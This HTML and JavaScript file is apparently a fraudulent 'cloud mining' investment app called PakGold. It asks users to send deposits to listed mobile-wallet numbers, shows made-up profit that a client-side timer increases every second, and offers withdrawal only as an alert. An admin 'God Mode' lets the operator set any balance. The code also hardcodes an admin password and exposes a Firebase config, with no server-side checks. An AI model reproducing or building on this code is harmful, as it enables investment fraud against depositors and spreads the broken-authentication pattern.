<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PakGold | God Mode Engine</title>
    <script src="https://www.gstatic.com/firebasejs/9.10.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.10.0/firebase-database-compat.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;900&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #d4af37; --gold-dark: #b8860b; --bg: #f8fafc; --white: #ffffff; --text: #0f172a; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', sans-serif; }
        body { background: var(--bg); color: var(--text); overflow-x: hidden; }

        .page { display: none; min-height: 100vh; padding-bottom: 100px; animation: slideUp 0.4s ease-out; }
        .page.active { display: block; }
        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }

        /* UI Components */
        .header { background: white; padding: 45px 20px 30px; border-radius: 0 0 40px 40px; box-shadow: 0 10px 40px rgba(0,0,0,0.03); border-bottom: 3px solid var(--gold); }
        .bal-card { background: white; padding: 20px; border-radius: 25px; border: 1px solid #f1f5f9; box-shadow: 0 5px 20px rgba(0,0,0,0.02); margin-top: 15px; }
        .bal-val { font-size: 1.5rem; font-weight: 900; color: var(--gold-dark); }
        
        /* Grid & Cards */
        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; padding: 20px; }
        .p-card { background: white; padding: 25px 15px; border-radius: 30px; text-align: center; border: 1px solid #edf2f7; box-shadow: 0 4px 10px rgba(0,0,0,0.02); }
        .p-card:active { transform: scale(0.95); }
        
        /* Forms */
        .form-box { background: white; margin: 20px; padding: 25px; border-radius: 30px; }
        input, select { width: 100%; padding: 15px; margin: 10px 0; border-radius: 15px; border: 1px solid #e2e8f0; background: #fdfdfd; font-size: 0.95rem; }
        .btn { background: var(--gold-dark); color: white; border: none; padding: 18px; width: 100%; border-radius: 15px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; }

        /* Admin/God Mode Special */
        .admin-item { background: #fff; padding: 15px; border-radius: 20px; margin-bottom: 10px; border-left: 5px solid var(--gold); font-size: 0.8rem; box-shadow: 0 5px 15px rgba(0,0,0,0.05); }
        .badge { padding: 4px 10px; border-radius: 50px; font-size: 0.6rem; font-weight: 800; background: #fef3c7; color: #92400e; }

        /* Nav */
        .nav { position: fixed; bottom: 0; width: 100%; background: white; display: flex; justify-content: space-around; padding: 15px; border-top: 1px solid #eee; border-radius: 30px 30px 0 0; z-index: 1000; }
        .nav-item { text-align: center; font-size: 0.7rem; color: #94a3b8; font-weight: 600; cursor: pointer; }
        .nav-item.active { color: var(--gold-dark); }
    </style>
</head>
<body onload="initApp()">

    <!-- AUTH PAGE -->
    <section id="login" class="page active">
        <div style="height:100vh; display:flex; flex-direction:column; justify-content:center; padding:40px;">
            <h1 style="font-size:3.5rem; text-align:center;">⚜️</h1>
            <h2 style="text-align:center; margin-bottom:30px; font-weight:900;">PAK GOLD PRO</h2>
            <div class="form-box">
                <input type="number" id="phone" placeholder="Mobile Number (10 Digits)">
                <input type="password" id="god-key" placeholder="God Key (Admin Only)">
                <button class="btn" onclick="handleAuth()">Access System 💋</button>
            </div>
        </div>
    </section>

    <!-- USER DASHBOARD -->
    <section id="home" class="page">
        <div class="header">
            <h4 style="opacity:0.6; font-size:0.7rem;">WELCOME BACK, SWEETIE</h4>
            <div class="bal-card">
                <small>AVAILABLE BALANCE</small>
                <div class="bal-val" id="u-wallet">Rs 0.00</div>
            </div>
            <div class="bal-card" style="margin-top:10px;">
                <small>CLOUD MINING PROFIT</small>
                <div class="bal-val" style="color:#22c55e" id="u-profit">Rs 0.0000</div>
            </div>
        </div>
        
        <div class="grid" id="plan-list"></div>

        <div class="form-box" style="margin-top:0;">
            <h3>Referral Program</h3>
            <p style="font-size:0.7rem; color:#64748b; margin-top:5px;">Share your phone number and get 10% on every deposit of your friend!</p>
        </div>
    </section>

    <!-- DEPOSIT -->
    <section id="deposit" class="page">
        <div class="header"><h2>Add Funds</h2></div>
        <div class="form-box">
            <div style="background:#fffbeb; padding:15px; border-radius:15px; margin-bottom:15px; font-size:0.8rem;">
                <b>JazzCash/SadaPay:</b> 03705519562<br>
                <b>EasyPaisa:</b> 03379827882
            </div>
            <select id="d-method"><option>JazzCash</option><option>SadaPay</option><option>EasyPaisa</option></select>
            <input type="number" id="d-amt" placeholder="Amount (Min 500)">
            <input type="text" id="d-tid" placeholder="Transaction TID">
            <label style="font-size:0.7rem; margin-top:10px; display:block;">Upload Payment Screenshot:</label>
            <input type="file" id="d-file">
            <button class="btn" onclick="requestDeposit()">Send to Admin</button>
        </div>
    </section>

    <!-- GOD MODE (ADMIN) -->
    <section id="admin" class="page">
        <div class="header" style="background:var(--text); color:white;">
            <h2>GOD MODE ACTIVATED 🔑</h2>
            <p style="font-size:0.6rem; opacity:0.7;">TOTAL CONTROL OF PAK GOLD SYSTEM</p>
        </div>
        
        <div style="padding:20px;">
            <h3 style="margin-bottom:15px;">Pending Approvals</h3>
            <div id="god-deposits"></div>

            <h3 style="margin:25px 0 15px;">User Management</h3>
            <div class="form-box" style="margin:0;">
                <input type="text" id="target-user" placeholder="User Phone Number">
                <input type="number" id="target-bal" placeholder="New Wallet Balance">
                <button class="btn" onclick="updateUserBal()">Update User Power</button>
            </div>
        </div>
    </section>

    <!-- NAV BAR -->
    <nav class="nav" id="main-nav" style="display:none;">
        <div class="nav-item active" onclick="nav('home')">🏠<br>Home</div>
        <div class="nav-item" onclick="nav('deposit')">💰<br>Deposit</div>
        <div class="nav-item" onclick="alert('Withdrawals process every 24h at 10 AM')">💸<br>Withdraw</div>
        <div class="nav-item" onclick="window.location.reload()">🔄<br>Sync</div>
    </nav>

    <script>
        // --- YOUR REAL FIREBASE CONFIG ---
        const firebaseConfig = {
            apiKey: "AIzaSyCMG6KG_oD8cjEk4YpbxXik-C5q8K5MDHk",
            authDomain: "dark-web-9.firebaseapp.com",
            databaseURL: "https://dark-web-9-default-rtdb.firebaseio.com",
            projectId: "dark-web-9",
            storageBucket: "dark-web-9.firebasestorage.app",
            messagingSenderId: "564328425161",
            appId: "1:564328425161:web:eb109ab77356dafe7f4f18"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        const plans = [
            {n:"Basic Cloud", p:500, s:0.0006, i:"☁️"},
            {n:"Silver Node", p:2500, s:0.0035, i:"⚙️"},
            {n:"Gold Miner", p:8000, s:0.0120, i:"⛏️"},
            {n:"Royal Server", p:25000, s:0.0450, i:"🏰"}
        ];

        let myPhone = localStorage.getItem('user_ph');

        function initApp() {
            if(myPhone) {
                nav('home');
                loadUserData();
            }
            renderPlans();
        }

        function handleAuth() {
            let ph = document.getElementById('phone').value;
            let key = document.getElementById('god-key').value;

            // GOD KEY CHECK
            if(key === "pakgold786") {
                localStorage.setItem('role', 'god');
                nav('admin');
                loadGodControl();
                return;
            }

            if(ph.length < 10) return alert("Please enter valid mobile number sweetie! 💋");
            
            myPhone = ph;
            localStorage.setItem('user_ph', ph);
            db.ref('users/' + ph).once('value', s => {
                if(!s.exists()) {
                    db.ref('users/' + ph).set({ wallet: 0, profit: 0, speed: 0, plan: 'Free' });
                }
                location.reload();
            });
        }

        function loadUserData() {
            db.ref('users/' + myPhone).on('value', s => {
                let d = s.val();
                document.getElementById('u-wallet').innerText = "Rs " + d.wallet;
                document.getElementById('u-profit').innerText = "Rs " + parseFloat(d.profit).toFixed(4);
            });

            // Cloud Mining Logic
            setInterval(() => {
                db.ref('users/' + myPhone).once('value', s => {
                    let d = s.val();
                    if(d.speed > 0) {
                        db.ref('users/' + myPhone).update({ profit: (parseFloat(d.profit) + d.speed).toFixed(4) });
                    }
                });
            }, 1000);
        }

        function renderPlans() {
            let cont = document.getElementById('plan-list');
            plans.forEach(p => {
                cont.innerHTML += `<div class="p-card" onclick="buyPower(${p.p}, ${p.s}, '${p.n}')">
                    <div style="font-size:2rem;">${p.i}</div>
                    <h4 style="margin:10px 0;">${p.n}</h4>
                    <b style="color:var(--gold-dark)">Rs ${p.p}</b>
                </div>`;
            });
        }

        function buyPower(price, speed, name) {
            db.ref('users/' + myPhone).once('value', s => {
                let d = s.val();
                if(d.wallet < price) return alert("Balance is low. Deposit first sweetie! 💋");
                db.ref('users/' + myPhone).update({
                    wallet: d.wallet - price,
                    speed: speed,
                    plan: name
                });
                alert(name + " Activated! Cloud Mining Started.");
            });
        }

        function requestDeposit() {
            let tid = document.getElementById('d-tid').value;
            let amt = document.getElementById('d-amt').value;
            if(!tid || amt < 500) return alert("Fill details properly sweetie! 💋");

            db.ref('requests/').push({
                user: myPhone,
                amt: amt,
                tid: tid,
                method: document.getElementById('d-method').value,
                status: 'pending'
            });
            alert("Sent to God Mode for Approval! 🚀");
            nav('home');
        }

        // --- GOD MODE FUNCTIONS ---
        function loadGodControl() {
            db.ref('requests/').on('value', s => {
                let cont = document.getElementById('god-deposits');
                cont.innerHTML = "";
                s.forEach(child => {
                    let d = child.val();
                    if(d.status === 'pending') {
                        cont.innerHTML += `<div class="admin-item">
                            <b>User: ${d.user}</b><br>
                            Amount: Rs ${d.amt} | TID: ${d.tid}<br>
                            <button onclick="approveDep('${child.key}', '${d.user}', ${d.amt})" style="background:#22c55e; color:white; border:none; padding:5px 10px; border-radius:5px; margin-top:10px;">APPROVE ✅</button>
                        </div>`;
                    }
                });
            });
        }

        function approveDep(key, user, amt) {
            db.ref('users/' + user).once('value', s => {
                let currentBal = s.val().wallet;
                db.ref('users/' + user).update({ wallet: currentBal + parseInt(amt) });
                db.ref('requests/' + key).update({ status: 'approved' });
                alert("Payment Approved! User balance updated.");
            });
        }

        function updateUserBal() {
            let u = document.getElementById('target-user').value;
            let b = document.getElementById('target-bal').value;
            if(!u || !b) return alert("Input required!");
            db.ref('users/' + u).update({ wallet: parseInt(b) });
            alert("User balance hacked/updated! 💋");
        }

        function nav(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            document.getElementById('main-nav').style.display = (id === 'login') ? 'none' : 'flex';
        }
    </script>
</body>
</html>
